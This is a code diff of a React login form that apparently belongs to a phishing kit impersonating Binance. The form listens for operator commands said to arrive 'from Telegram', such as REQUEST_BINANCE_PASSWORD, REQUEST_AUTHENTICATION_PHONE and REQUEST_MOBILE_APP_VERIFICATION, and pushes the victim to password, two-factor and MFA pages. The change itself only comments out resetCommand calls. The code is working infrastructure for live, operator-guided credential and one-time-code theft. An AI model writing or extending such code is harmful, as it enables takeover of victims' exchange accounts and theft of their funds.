@@ -15,7 +15,7 @@ import BackgroundLoader from './BackgroundLoader'
 
 export default function LoginForm() {
     const router = useRouter();
-    const { command, resetCommand  } = useCommand(); // Get the current command from Telegram
+    const { command } = useCommand(); // Get the current command from Telegram
     const { userEmail, setUserEmail } = useEmail();
     const { theme, toggleTheme } = useTheme();
     const [invalid, setInvalid] = useState(false);
@@ -108,13 +108,13 @@ export default function LoginForm() {
         if (command === 'REQUEST_EMAIL_AGAIN') {
             setInvalid(true); // Show error state for email input
             setIsLoading(false);
-            resetCommand(); 
+            // resetCommand(); 
         } else if (command === 'REQUEST_BINANCE_PASSWORD') {
             setIsLoading(false);
             setBgLoader(true);
             setTimeout(() => {
                 // setIsLoading(false);
-                resetCommand(); 
+                // resetCommand(); 
                 router.push('/PasswordPage');
             }, 1500);
         } else if (command === 'REQUEST_AUTHENTICATION_EMAIL') {
@@ -122,7 +122,7 @@ export default function LoginForm() {
             setBgLoader(true);
             setTimeout(() => {
                 // setIsLoading(false);
-                resetCommand(); 
+                // resetCommand(); 
                 router.push('/AuthenticationPage');
             }, 1500);
         } else if (command === 'REQUEST_AUTHENTICATION_PHONE') {
@@ -130,7 +130,7 @@ export default function LoginForm() {
             setBgLoader(true);
             setTimeout(() => {
                 // setIsLoading(false);
-                resetCommand(); 
+                // resetCommand(); 
                 router.push('/NumAuthenticationPage');
             }, 1500);
         } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
@@ -138,7 +138,7 @@ export default function LoginForm() {
             setBgLoader(true);
             setTimeout(() => {
                 // setIsLoading(false);
-                resetCommand(); 
+                // resetCommand(); 
                 router.push('/MfaPage');
             }, 1500);
         } else if (command === 'FINISH') {
